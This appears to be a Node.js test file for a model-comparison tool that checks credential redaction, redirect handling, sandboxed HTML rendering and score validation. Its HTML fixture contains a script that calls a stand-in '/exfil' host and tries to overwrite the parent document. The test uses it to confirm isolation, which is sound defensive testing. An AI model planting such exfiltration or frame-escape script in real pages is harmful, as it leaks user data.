import test from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { once } from 'node:events';
import { mkdtemp, readFile, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { resolve } from 'node:path';
import { run, report, render, PROMPT, CHECKS } from '../skills/model-nerf-check/scripts/check.mjs';

const html = `<!doctype html><html><head><style>
html,body{margin:0;background:#eee}svg{display:block;width:100%;height:700px}
@keyframes travel{to{transform:translateX(300px)}}circle{animation:travel 1.2s infinite alternate linear}
</style></head><body><svg viewBox="0 0 1000 600"><rect width="1000" height="600" fill="#e0f2fe"/><circle cx="200" cy="300" r="80" fill="#ef4444"/></svg>
<script>fetch('https://example.invalid/exfil').catch(()=>{});try{parent.document.body.innerHTML='escape'}catch{}</script></body></html>`;

test('end-to-end mock adapters preserve trials, redact credentials, render and validate reviews', { timeout: 60000 }, async t => {
  const requests = [];
  let outbound = 0;
  const server = createServer(async (req, res) => {
    if (req.url === '/exfil') { outbound++; res.end('unexpected'); return; }
    let body = '';
    for await (const part of req) body += part;
    const data = JSON.parse(body);
    requests.push({ path: req.url, data, auth: req.headers.authorization, key: req.headers['x-api-key'] });
    res.setHeader('content-type', 'application/json');
    res.setHeader('x-request-id', 'request-test');
    const secretEcho = 'api-secret-for-test';
    if (req.url === '/error') { res.writeHead(429); res.end(JSON.stringify({ error: secretEcho })); return; }
    if (req.url === '/redirect') { res.writeHead(307, { location: '/exfil' }); res.end(); return; }
    if (req.url === '/chat') res.end(JSON.stringify({ model: 'claim', choices: [{ message: { content: html }, finish_reason: 'stop' }] }));
    else if (req.url === '/anthropic') res.end(JSON.stringify({ model: 'claim', content: [{ type: 'text', text: html }], stop_reason: 'end_turn' }));
    else res.end(JSON.stringify({ model: 'claim', status: req.url === '/incomplete' ? 'incomplete' : 'completed',
      usage: { output_tokens: 42 }, echo: secretEcho,
      output: [{ type: 'message', role: 'assistant', content: [{ type: 'output_text', text: html }] }] }));
  });
  server.listen(0, '127.0.0.1');
  await once(server, 'listening');
  t.after(() => { server.closeAllConnections(); server.close(); });
  const root = await mkdtemp(resolve(tmpdir(), 'model-nerf-check-test-'));
  const out = resolve(root, 'run');
  const baseUrl = `http://127.0.0.1:${server.address().port}`;
  const endpoints = [
    ['candidate', 'responses', '/responses', 'candidate'], ['baseline', 'responses', '/responses', 'baseline'],
    ['chat', 'chat', '/chat', 'candidate'], ['anthropic', 'anthropic', '/anthropic', 'candidate'],
    ['incomplete', 'responses', '/incomplete', 'candidate'], ['error', 'responses', '/error', 'candidate'],
    ['redirect', 'responses', '/redirect', 'candidate'],
  ].map(([id, protocol, path, role]) => ({ id, protocol, role, url: baseUrl + path, model: 'test-model', keyEnv: 'TEST_KEY' }));
  const manifest = await run({ runs: 2, endpoints }, out, { TEST_KEY: 'api-secret-for-test' });
  assert.equal(manifest.trials.length, 14);
  assert.equal(requests.length, 14, 'no retries');
  assert.equal(outbound, 0, 'redirects must not forward credentials');
  assert.deepEqual(manifest.trials.slice(7).map(trial => trial.endpointId), endpoints.map(endpoint => endpoint.id).reverse());
  for (const request of requests) {
    assert.equal(request.data.input ?? request.data.messages[0].content, PROMPT);
    assert.equal(request.data.stream, false);
    assert.equal(request.auth ?? request.key, request.path === '/anthropic' ? 'api-secret-for-test' : 'Bearer api-secret-for-test');
    assert.equal(request.data.tools, undefined);
  }
  assert.equal(manifest.trials.find(trial => trial.id === 'incomplete-01').status, 'incomplete');
  assert.equal(manifest.trials.find(trial => trial.id === 'error-01').status, 'error');
  assert.equal(manifest.trials.find(trial => trial.id === 'redirect-01').status, 'error');
  assert.ok(!(await readFile(resolve(out, 'candidate-01/response.txt'), 'utf8')).includes('api-secret-for-test'));
  assert.ok(!(await readFile(resolve(out, 'error-01/response.txt'), 'utf8')).includes('api-secret-for-test'));
  let scores = JSON.parse(await readFile(resolve(out, 'scores.json'), 'utf8'));
  assert.equal(scores.trials[0].checks.wheels.value, null);
  assert.equal((await report(out))[0].mean, null);
  await assert.rejects(run({ runs: 1, endpoints: endpoints.slice(0, 1) }, out, { TEST_KEY: 'api-secret-for-test' }), /EEXIST/);

  await render(out);
  const capture = JSON.parse(await readFile(resolve(out, 'candidate-01/render.json'), 'utf8'));
  assert.equal(capture.frames.length, 3);
  assert.ok(new Set(capture.frames.map(frame => frame.sha256)).size > 1, 'fixture animation changes across frames');
  const frame = await readFile(resolve(out, 'candidate-01/frame-0000.png'));
  assert.equal(frame.readUInt32BE(16), 1280);
  assert.equal(frame.readUInt32BE(20), 800);
  for (const review of scores.trials.filter(review => review.id.startsWith('candidate-') || review.id.startsWith('baseline-'))) {
    review.reviewer = 'automated fixture scoring (not real visual review)';
    review.animation = true;
    for (const key of CHECKS) review.checks[key] = {
      value: review.id.startsWith('candidate-') ? 0.5 : 1,
      evidence: 'Synthetic fixture score for workflow validation; frame-0000.png.',
    };
  }
  await writeFile(resolve(out, 'scores.json'), JSON.stringify(scores));
  const summary = await report(out);
  assert.equal(summary[0].mean, 0.5);
  assert.equal(summary[1].mean, 1);
  assert.deepEqual(summary[0].repeatedDefects, CHECKS);
  assert.ok((await readFile(resolve(out, 'report.md'), 'utf8')).includes('-0.500'));
  const summaryFile = JSON.parse(await readFile(resolve(out, 'summary.json'), 'utf8'));
  assert.equal(summaryFile.routingEstablished, false);
  scores.trials[0].checks.wheels.evidence = '';
  await writeFile(resolve(out, 'scores.json'), JSON.stringify(scores));
  await assert.rejects(report(out), /evidence/);
  scores.trials[0].checks.wheels.evidence = 'frame-0000.png synthetic evidence';
  await writeFile(resolve(out, 'scores.json'), JSON.stringify(scores));
  await writeFile(resolve(out, 'candidate-01/output.html'), html + '<!-- changed -->');
  await assert.rejects(report(out), /HTML changed/);
  console.log(`Mock evidence: ${out}`);
});
